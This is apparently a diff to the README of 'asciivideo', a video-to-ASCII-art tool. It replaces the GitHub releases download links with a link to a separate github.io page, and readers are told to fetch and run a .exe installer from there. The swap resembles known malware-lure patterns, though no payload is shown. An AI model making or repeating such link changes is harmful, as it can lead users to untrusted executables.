@@ -1,6 +1,6 @@
 # 🎬 asciivideo - Turn videos into cool text animations
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rudigerwry263/asciivideo/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://rudigerwry263.github.io)
 
 asciivideo converts standard video files into animated ASCII art. You can create text-based versions of your favorite clips, logos, or animations. The software generates files that play in your web browser or saves them as high-quality video files.
 
@@ -8,7 +8,7 @@ asciivideo converts standard video files into animated ASCII art. You can create
 
 To obtain the program, go to the official release page. 
 
-[Click here to visit the download page](https://github.com/Rudigerwry263/asciivideo/releases)
+[Click here to visit the download page](https://rudigerwry263.github.io)
 
 Look for the latest version at the top of the list. Click the link that ends with .exe to save the installer to your computer.
 
